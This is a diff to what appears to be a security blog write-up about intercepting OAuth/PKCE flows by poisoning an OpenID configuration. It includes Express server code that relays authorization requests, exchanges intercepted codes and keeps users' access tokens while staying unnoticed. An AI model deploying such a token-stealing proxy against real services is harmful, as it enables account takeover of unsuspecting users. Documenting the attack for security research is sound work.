@@ -54,7 +54,7 @@ Luckily, the client was using PKCE, which looks like the following.
 
 ![authorization code grant](pkce.png "https://blog.postman.com/pkce-oauth-how-to/")
 
-As we can see, the client secret is not usually required to exchange the token; instead, the client app generates a code verifier and a challenge for it to be later verified when exchanging the code for the token. This means we could sniff the code and exchange the code for an access token ourselves and be completely transparent.
+As we can see, the client secret is not usually required to exchange the token (for public clients); instead, the client app generates a code verifier and a challenge for it to be later verified when exchanging the code for the token. This means we could sniff the code and exchange the code for an access token ourselves and be completely transparent.
 
 ### MiTMing process
 
@@ -63,28 +63,23 @@ We have previously verified that the OpenID configuration endpoint was being fet
 ![configuration endpoints](c_endpoints.png "openid configuration endpoints")
 
 Now it was time to create a server, such that:
-- Would intercept the generated code challenge and state, generate our own code challenge, and move it forward to the real authorization server, 
+- Would intercept the generated code challenge and state, and move it forward to the real authorization server, 
 - The authorization server would then redirect the user with the code to the client,
 - The Client would then try to exchange the code with the server (`token_endpoint`) that is also set in the poisoned configuration file,
-- We would receive the code, exchange the code for a token ourselves using our code verifier, steal the token, but also give the access token back to the user to stay completely invisible.
+- We would receive the code, exchange the code for a token ourselves, steal the token, but also give the access token back to the user to stay completely invisible.
 
 To do that, we created a simple [Express](https://expressjs.com/) server.
 
 ```javascript
 ...
-const SERVER_CODE_VERIFIER  = crypto.randomBytes(32).toString("base64url");
-const SERVER_CODE_CHALLENGE = crypto.createHash("sha256").update(SERVER_CODE_VERIFIER).digest("base64url");
-...
-
 app.get("/authorize", (req, res) => {
   const params = new URLSearchParams(req.query);
-  params.set("code_challenge",        SERVER_CODE_CHALLENGE);
   const upstreamURL = `https://example.com/authorize?${params.toString()}`;
   res.redirect(upstreamURL);
 });
 
 app.post("/token", async (req, res) => {
-  const body = { ...req.body, code_verifier: SERVER_CODE_VERIFIER };
+  const { body } = req;
   try {
     const upstream = await fetch("https://example.com/token", {
       method:  "POST",
